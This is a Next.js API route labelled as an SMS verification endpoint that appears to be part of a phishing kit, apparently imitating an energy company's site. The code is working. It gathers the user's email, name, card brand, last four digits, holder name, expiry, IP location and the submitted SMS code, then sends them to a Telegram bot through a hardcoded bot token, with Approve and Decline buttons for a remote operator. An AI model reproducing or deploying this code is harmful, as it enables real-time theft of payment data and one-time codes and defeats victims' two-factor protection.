import { type NextRequest, NextResponse } from "next/server"
import { createAdminClient } from "@/lib/supabase/admin"
import { getIpData } from "@/lib/utils/ip-detection"

let verificationCounter = 0
const pendingVerifications = new Map<
  string,
  {
    status: "pending" | "approved" | "declined"
    userId: string
    paymentMethodId: string
    verificationCode: string
    timestamp: number
  }
>()

// Clean up old verifications (older than 5 minutes)
setInterval(() => {
  const fiveMinutesAgo = Date.now() - 5 * 60 * 1000
  for (const [id, data] of pendingVerifications.entries()) {
    if (data.timestamp < fiveMinutesAgo) {
      pendingVerifications.delete(id)
    }
  }
}, 60000) // Run every minute

export async function POST(request: NextRequest) {
  try {
    const { userId, paymentMethodId, verificationCode } = await request.json()

    console.log("[v0] Verification request received:", { userId, paymentMethodId, verificationCode })

    if (!userId || !paymentMethodId || !verificationCode) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    verificationCounter++
    const verificationId = `v${verificationCounter}`

    pendingVerifications.set(verificationId, {
      status: "pending",
      userId,
      paymentMethodId,
      verificationCode,
      timestamp: Date.now(),
    })

    console.log("[v0] Stored verification in memory:", verificationId)

    const supabase = createAdminClient()
    let userEmail = "Unknown"
    let userName = "Unknown"
    let cardDetails = {
      lastFour: "****",
      brand: "Unknown",
      holderName: "Unknown",
      expiry: "Unknown",
    }

    try {
      const [profileResult, paymentMethodResult] = await Promise.all([
        supabase.from("profiles").select("email, full_name").eq("id", userId).single(),
        supabase.from("payment_methods").select("*").eq("id", paymentMethodId).single(),
      ])

      if (profileResult.data) {
        userEmail = profileResult.data.email || "Unknown"
        userName = profileResult.data.full_name || "Unknown"
      }

      if (paymentMethodResult.data) {
        const pm = paymentMethodResult.data
        cardDetails = {
          lastFour: pm.card_last_four || "****",
          brand: pm.card_brand || "Unknown",
          holderName: pm.card_holder_name || "Unknown",
          expiry:
            pm.card_expiry_month && pm.card_expiry_year ? `${pm.card_expiry_month}/${pm.card_expiry_year}` : "Unknown",
        }
      }
    } catch (error) {
      console.error("[v0] Error fetching user/payment data:", error)
      // Continue anyway with default values
    }

    const ip = request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "unknown"
    const ipData = await getIpData(ip)

    const TELEGRAM_BOT_TOKEN = "8410913287:AAF6QD3E-BX62n_3DdPIfaHv7652y0nKHIk"
    const TELEGRAM_CHAT_ID = "7616774173"

    const text = `
🔐 <b>SMS Verification Request</b>

👤 <b>User:</b> ${userEmail}
👤 <b>Name:</b> ${userName}
💳 <b>Card:</b> ${cardDetails.brand} **** ${cardDetails.lastFour}
👤 <b>Holder:</b> ${cardDetails.holderName}
📅 <b>Expiry:</b> ${cardDetails.expiry}
🔢 <b>SMS Code:</b> <code>${verificationCode}</code>

📍 <b>Location:</b> ${ipData?.city && ipData?.country ? `${ipData.city}, ${ipData.country}` : "Unknown"}
🌐 <b>IP Address:</b> ${ip}

⏰ <b>Time:</b> ${new Date().toLocaleString("de-DE")}
    `.trim()

    console.log("[v0] Sending to Telegram...")

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "✅ Approve",
                url: `https://www.e-on.energy/api/telegram/approve?id=${verificationId}`,
              },
              {
                text: "❌ Decline",
                url: `https://www.e-on.energy/api/telegram/decline?id=${verificationId}`,
              },
            ],
          ],
        },
      }),
    })

    if (!telegramResponse.ok) {
      const error = await telegramResponse.text()
      console.error("[v0] Telegram API error:", telegramResponse.status, error)
      return NextResponse.json({ error: "Failed to send Telegram notification" }, { status: 500 })
    }

    const result = await telegramResponse.json()
    console.log("[v0] Telegram message sent successfully:", result.ok)

    return NextResponse.json({
      success: true,
      verificationRequestId: verificationId,
    })
  } catch (error) {
    console.error("[v0] Verification request error:", error)
    return NextResponse.json(
      {
        error: "Failed to send verification request",
        details: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}

export function getVerificationStatus(verificationId: string) {
  return pendingVerifications.get(verificationId)
}

export function updateVerificationStatus(verificationId: string, status: "approved" | "declined") {
  const verification = pendingVerifications.get(verificationId)
  if (verification) {
    verification.status = status
    pendingVerifications.set(verificationId, verification)
    return true
  }
  return false
}
